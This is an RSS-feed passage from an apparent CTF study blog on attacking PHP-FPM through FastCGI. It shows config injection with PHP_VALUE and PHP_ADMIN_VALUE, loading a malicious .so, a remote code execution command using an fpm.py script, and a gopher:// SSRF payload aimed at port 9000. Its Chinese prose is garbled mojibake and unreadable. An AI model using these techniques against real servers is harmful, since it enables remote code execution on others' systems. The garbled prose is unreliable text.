&lt;p>&lt;a href="https://xz.aliyun.com/t/3339#toc-3">LCTF 2018 Writeup &amp;ndash; ROIS&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.jianshu.com/p/dfd049924258">LFI via SegmentFault&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">PHPä¸­SESSIONååºåˆ—åŒ–æœºåˆ¶&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.freebuf.com/news/202819.html">åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«å’Œååºåˆ—åŒ–æ¸—é€&lt;/a>&lt;/p>
&lt;p>å¦‚æœ‰é—æ¼è¯·æŒ‡æ­£ï¼ï¼ï¼&lt;/p>
&lt;/details></description></item><item><title>æ”»å‡»PHP-FPMå­¦ä¹ ç¬”è®°</title><link>https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/</link><pubDate>Thu, 18 Nov 2021 00:03:25 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/</guid><description>&lt;p>ä¹‹å‰åšé¢˜æ€»æ˜¯ä¼šè§åˆ°ï¼Œä½†å¹¶ä¸æ˜¯å¾ˆæ‡‚å®é™…çš„åŸç†ï¼Œæœ‰ç‚¹äº‘é‡Œé›¾é‡Œçš„ï¼Œå¥½åƒæ‡‚äº†ä½†åˆæ²¡æœ‰å®Œå…¨æ‡‚ï¼Œæ˜¯æ—¶å€™ä¸“é—¨æ¥å­¦ä¸€ä¸‹å’¯ï¼&lt;/p>
&lt;p>æ²¡æœ‰ä»€ä¹ˆæ–°é²œçš„ä¸œè¥¿ï¼Œåªä¸è¿‡æŠŠå¸ˆå‚…ä»¬å·²æœ‰çš„æ–‡ç« è¿›è¡Œä¸€ä¸ªæ•´åˆ&amp;amp;é‡æ–°æ•´ç†ï¼Œå‚è€ƒé“¾æ¥æ”¾åˆ°æœ€åå•¦w&lt;/p>
&lt;h2 id="å‰ç½®çŸ¥è¯†">å‰ç½®çŸ¥è¯†&lt;/h2>
&lt;h3 id="cgifastcgi">CGI/FastCGI&lt;/h3>
&lt;p>CGIåè®®ç”¨äºå¤„ç†htmlè¿™ç±»é™æ€æ–‡ä»¶ä¹‹åå‡ºç°çš„åŠ¨æ€è¯­è¨€çš„è§£é‡Šå™¨ä¸webserveré€šä¿¡çš„é—®é¢˜ï¼Œå…·ä½“çš„å®ç°æœ‰php-cgi&lt;/p>
&lt;p>CGIçš„å¼Šç«¯æ˜¯ä»¤webserveræ¯æ¬¡å¤„ç†è¯·æ±‚æ—¶éƒ½ä¼šforkä¸€ä¸ªcgiè¿›ç¨‹ï¼Œç»“æŸåå†killï¼Œæ¯”è¾ƒæµªè´¹èµ„æºï¼ŒFastCGIåè®®å°±è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼Œå¤„ç†å®Œè¯·æ±‚åä¸ä¼škillè€Œæ˜¯ä¿ç•™è¯¥è¿›ç¨‹ï¼Œä½¿å®ƒå¯ä»¥ä¸€æ¬¡å¤„ç†å¤šä¸ªè¯·æ±‚ï¼Œè¿™æ ·å°±ä¸ç”¨æ¯æ¬¡forkäº†&lt;/p>
&lt;p>è€Œphp-fpmå°±æ˜¯FastCGIåè®®çš„ä¸€ä¸ªå…·ä½“å®ç°ï¼Œä½œä¸ºFastCGIè¿›ç¨‹ç®¡ç†å™¨ï¼ˆè¿è¡Œæ—¶æœ‰ä¸€ä¸ªä¸»è¿›ç¨‹å’Œå¤šä¸ªåŒ…å«phpè§£é‡Šå™¨çš„workerè¿›ç¨‹æ¥æ‰§è¡Œä»£ç ï¼‰ï¼Œç”¨äºæ¥æ”¶webserverçš„è¯·æ±‚&lt;/p>
&lt;p>æŸ¥çœ‹phpinfoï¼ŒSever APIå¤„ä¸€èˆ¬ä¼šæœ‰ä¸‰ç§æ ·å¼ï¼š&lt;/p>
&lt;ul>
&lt;li>Apache 2.0 Handler&lt;/li>
&lt;li>CGI/FastCGI&lt;/li>
&lt;li>FPM/FastCGI&lt;/li>
&lt;/ul>
&lt;p>ç¬¬ä¸€ç§æŠŠphpä½œä¸ºapacheçš„ä¸€ä¸ªæ¨¡å—ï¼Œç›¸å½“äºapacheä¸­çš„ä¸€ä¸ª.dllæˆ–.soï¼›ç¬¬äºŒç§php-cgi.exeæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹ï¼ŒwebæœåŠ¡å™¨ä¹Ÿæ˜¯ç‹¬ç«‹çš„apache.exeï¼ŒwebæœåŠ¡å™¨ç›‘å¬åˆ°httpè¯·æ±‚æ—¶ä¼šå»è°ƒç”¨php-cgiè¿›ç¨‹ï¼Œä¹‹é—´é€šè¿‡cgiåè®®ä¼ é€’æ•°æ®ï¼›è€Œç¬¬ä¸‰ç§fastcgiä¹Ÿæ˜¯ä¸€ç§åè®®ï¼Œå®ƒåšäº†å¾ˆå¤šä¼˜åŒ–ä¸”å¸¸é©»å†…å­˜ ä¸ç”¨æ¯æ¬¡éƒ½è°ƒç”¨ä¸€ä¸‹cgiï¼Œæœ‰è¾…åŠ©åŠŸèƒ½æ¯”å¦‚å†…å­˜ç®¡ç†ï¼Œåƒåœ¾å¤„ç†ç”±php-fpmæ¥å®ç°&lt;/p>
&lt;h3 id="é…ç½®">é…ç½®&lt;/h3>
&lt;p>php-fpmé€šä¿¡æ–¹å¼æœ‰tcpï¼ˆæœ¬åœ°ç›‘å¬9000ç«¯å£ï¼‰å’Œunix socketå¥—æ¥å­—ä¸¤ç§æ–¹å¼ï¼Œé¢˜ç›®ä¸­å¯ä»¥è§åˆ°çš„éƒ½æ˜¯tcp9000&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>apt update
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apt install nginx -y
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apt install software-properties-common -y
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apt install php7.4-fpm -y
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="tcpæ¨¡å¼">tcpæ¨¡å¼&lt;/h4>
&lt;p>/etc/php/7.4/fpm/pool.d/www.conf&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">listen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">127.0.0.1:9000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>/etc/nginx/sites-enabled/default&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">location ~ \.php$ {&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">include snippets/fastcgi-php.conf;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fastcgi_pass 127.0.0.1:9000;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="unix-socketæ¨¡å¼">unix socketæ¨¡å¼&lt;/h4>
&lt;p>å¦‚æœå¯åŠ¨fpmä¸åšæ”¹åŠ¨ï¼Œé»˜è®¤ä¸ºå¥—æ¥å­—æ¨¡å¼&lt;/p>
&lt;p>/etc/php/7.4/fpm/pool.d/www.conf&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">listen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">/run/php/php7.4-fpm.sock&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>/etc/nginx/sites-enabled/default&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">location ~ \.php$ {&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">include snippets/fastcgi-php.conf;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fastcgi_pass unix:/run/php/php7.4-fpm.sock;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åé‡å¯å³å¯&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>service nginx start &lt;span style="color:#75715e"># reload&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/etc/init.d/php7.4-fpm start &lt;span style="color:#75715e"># restart&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦‚æœå‡ºç°æŠ¥é”™è¯·æŸ¥çœ‹å¯¹åº”æ—¥å¿—&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>cat /var/log/nginx/error.log
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat /var/log/php7.4-fpm.log
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="æ¼æ´æˆå› ">æ¼æ´æˆå› &lt;/h2>
&lt;p>æŒ‰FastCGIåè®®ä¼ è¾“çš„å†…å®¹åˆ†ä¸ºheaderå’Œbodyä¸¤éƒ¨åˆ†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">typedef&lt;/span> &lt;span style="color:#00a8c8">struct&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* Header */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">version&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// ç‰ˆæœ¬
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// æœ¬æ¬¡recordçš„ç±»å‹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">requestIdB1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// æœ¬æ¬¡recordå¯¹åº”çš„è¯·æ±‚id
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">requestIdB0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">contentLengthB1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// bodyä½“çš„å¤§å°
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">contentLengthB0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">paddingLength&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// é¢å¤–å—å¤§å°
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">reserved&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* Body */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">contentData&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">contentLength&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">paddingData&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">paddingLength&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#111">FCGI_Record&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…ˆä»hederä¸­æ‹¿åˆ°bodyä½“å¤§å°ï¼ˆæœ€å¤§2^16=65535å­—èŠ‚ï¼‰ï¼Œå†ä»tcpæµé‡Œè¯»å–å¤§å°ç­‰äºcontentLenthçš„bodyï¼Œä¹‹åè¿˜æœ‰ä¸€éƒ¨åˆ†é¢å¤–çš„padding&lt;/p>
&lt;p>headerä¸­çš„typeèµ·åˆ°æŒ‡å®šrecordçš„ä½œç”¨ï¼Œå› ä¸ºFastCGIçš„å•ä¸ªrecordå¤§å°æœ‰é™ä½œç”¨å•ä¸€ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªTCPæµä¸­ä¼ è¾“å¤šä¸ªrecordï¼Œé€šè¿‡typeæ¥æ ‡è¯†æ¯ä¸ªrecordçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼ŒrequestIdåšåˆ°åŒºåˆ†æ¯ä¸€æ¬¡çš„è¯·æ±‚&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112110643128.png" alt="image-20211112110643128">&lt;/p>
&lt;p>å½“type=4æ—¶ï¼Œè¡¨æ˜æ¶ˆæ¯ä¸­åŒ…å«çš„æ•°æ®ä¸ºæŸä¸ªname-valueå¯¹ï¼Œæ¯”å¦‚&lt;/p>
&lt;pre tabindex="0">&lt;code>{
&amp;#39;GATEWAY_INTERFACE&amp;#39;: &amp;#39;FastCGI/1.0&amp;#39;,
&amp;#39;REQUEST_METHOD&amp;#39;: &amp;#39;GET&amp;#39;,
&amp;#39;SCRIPT_FILENAME&amp;#39;: &amp;#39;/var/www/html/index.php&amp;#39;,
&amp;#39;SCRIPT_NAME&amp;#39;: &amp;#39;/index.php&amp;#39;,
&amp;#39;QUERY_STRING&amp;#39;: &amp;#39;?a=1&amp;amp;b=2&amp;#39;,
&amp;#39;REQUEST_URI&amp;#39;: &amp;#39;/index.php?a=1&amp;amp;b=2&amp;#39;,
&amp;#39;DOCUMENT_ROOT&amp;#39;: &amp;#39;/var/www/html&amp;#39;,
&amp;#39;SERVER_SOFTWARE&amp;#39;: &amp;#39;php/fcgiclient&amp;#39;,
&amp;#39;REMOTE_ADDR&amp;#39;: &amp;#39;127.0.0.1&amp;#39;,
&amp;#39;REMOTE_PORT&amp;#39;: &amp;#39;12345&amp;#39;,
&amp;#39;SERVER_ADDR&amp;#39;: &amp;#39;127.0.0.1&amp;#39;,
&amp;#39;SERVER_PORT&amp;#39;: &amp;#39;80&amp;#39;,
&amp;#39;SERVER_NAME&amp;#39;: &amp;#34;localhost&amp;#34;,
&amp;#39;SERVER_PROTOCOL&amp;#39;: &amp;#39;HTTP/1.1&amp;#39;
}
&lt;/code>&lt;/pre>&lt;p>å…¶ä¸­&lt;code>SCRIPT_FILENAME&lt;/code>å°±æ˜¯php-fpmä¼šå»æ‰§è¡Œçš„æ–‡ä»¶ï¼Œç”±äº5.3.9ç‰ˆæœ¬å¼•å…¥äº†&lt;code>security.limit_extensions&lt;/code>çš„é€‰é¡¹ï¼Œé»˜è®¤å¯¹åç¼€åé™åˆ¶åœ¨äº†phpå®¶æ—ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è€ƒè™‘æ‰¾åˆ°å·²å­˜åœ¨phpæ–‡ä»¶ï¼ˆå®‰è£…æ—¶é™„å¸¦çš„phpæ–‡ä»¶ å¯ä»¥é€šè¿‡&lt;code>find / -name &amp;quot;*.php&amp;quot;&lt;/code>æ¥æœç´¢ä¸€ä¸‹é»˜è®¤ç¯å¢ƒ æ¯”å¦‚/usr/local/lib/php/PEAR.phpï¼‰ï¼Œå‘å…¶ä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼›è€Œfpmæ”¯æŒé€šè¿‡è®¾ç½®&lt;code>FASTCGI_PARAMS&lt;/code>æ¥åŠ¨æ€ä¿®æ”¹phpçš„è®¾ç½®ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸¤é¡¹&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;#39;PHP_VALUE&amp;#39;: &amp;#39;auto_prepend_file = php://input&amp;#39;,
&amp;#39;PHP_ADMIN_VALUE&amp;#39;: &amp;#39;allow_url_include = On&amp;#39;
&lt;/code>&lt;/pre>&lt;p>æ¥åšåˆ°æ‰§è¡ŒæŸphpæ–‡ä»¶æ—¶è‡ªåŠ¨åŒ…å«POSTå†…å®¹ï¼Œæ‰§è¡Œæ¶æ„ä»£ç ï¼ˆdisable_functionåœ¨phpåŠ è½½æ—¶å°±ç¡®å®šå¥½äº†ï¼Œæ— æ³•é‡å†™ï¼‰&lt;/p>
&lt;h2 id="æ”»å‡»æ€è·¯ä¾‹é¢˜">æ”»å‡»æ€è·¯&amp;amp;&amp;amp;ä¾‹é¢˜&lt;/h2>
&lt;p>ä¼ªé€ ä¸€ä¸ªå¯ä»¥æ­£å¸¸é€šä¿¡çš„FastCGIå®¢æˆ·ç«¯ï¼Œå°†ä¼ è¾“çš„å†…å®¹ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„æ¶æ„payloadï¼Œå†å‘å‡ºå»&lt;/p>
&lt;h3 id="è¿œç¨‹æ”»å‡»php-fpm">è¿œç¨‹æ”»å‡»php-fpm&lt;/h3>
&lt;p>è¿™é‡Œæ˜¯&lt;a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">pç‰›çš„è„šæœ¬&lt;/a>ï¼Œå…¼å®¹py2&amp;amp;3ï¼Œé»˜è®¤-p 9000ï¼Œ-c &lt;code>&amp;lt;?php phpinfo();?&amp;gt;&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>python fpm.py target_ip /var/www/html/index.php -c &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php echo `id`;exit;?&amp;gt;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘ä»¬éœ€è¦æ”¹åŠ¨çš„åªæœ‰paramséƒ¨åˆ†çš„&lt;code>PHP_ADMIN_VALUE&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;#39;PHP_ADMIN_VALUE&amp;#39;: &amp;#39;allow_url_include = On\nextension = /home/amelia/TEMP/fpm/wuhu.so&amp;#39;,
&lt;/code>&lt;/pre>&lt;p>æˆåŠŸ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112175028236.png" alt="image-20211112175028236">&lt;/p>
&lt;p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœåªæ˜¯åŠ è½½æ¶æ„.soè€Œä¸æ‰§è¡Œä»£ç ï¼Œåˆ™å¹¶ä¸éœ€è¦æœ‰å·²å­˜åœ¨phpæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œç”¨&lt;code>_&lt;/code>å ä½å³å¯&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>python fpm.py target_ip _ -c &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php echo `id`;exit;?&amp;gt;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112175353957.png" alt="image-20211112175353957">&lt;/p>
&lt;h3 id="ssrfæ”»å‡»æœ¬åœ°php-fpm">SSRFæ”»å‡»æœ¬åœ°php-fpm&lt;/h3>
&lt;p>åˆ©ç”¨&lt;code>gopher://&lt;/code>åè®®å¯ä»¥ç›´æ¥ä¼ è¾“TCPåè®®æµï¼Œæˆ‘ä»¬æ„é€ å¥½payloadä¹‹åå°±å¯ä»¥ä¼ å…¥è¿›è¡Œssrfæ”»å‡»äº†&lt;/p>
&lt;p>æ„é€ payloadä¾æ—§ä½¿ç”¨pç‰›çš„è„šæœ¬ï¼Œä¸è¿‡åšä¸€ç‚¹å¾®å°çš„æ”¹åŠ¨ï¼›è¿™éƒ¨åˆ†å¯ä»¥å‚è§åé¢ç»“åˆftpæ”»å‡»fpmçš„å†…å®¹ï¼Œæ€»ä¹‹å°±ç…§è¿™å‡ æ­¥èµ°&lt;/p>
&lt;ul>
&lt;li>pç‰›è„šæœ¬ç”Ÿæˆurlencodeä¹‹åçš„tcpæ•°æ®æµ&lt;/li>
&lt;li>åŠ gopher://127.0.0.1:9000å‰ç¼€&lt;/li>
&lt;li>æ¢­ï¼?url=gopher://127.0.0.1:9000/_xxxxxxxxxxxxxxxx&lt;/li>
&lt;/ul>
&lt;h4 id="å¼ºç½‘é’å°‘-2021ssrf">[å¼ºç½‘é’å°‘ 2021]SSRF&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//like fpm?
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://&amp;#34;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://127.0.0.1/&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">curl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$ch&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_URL&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_HEADER&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
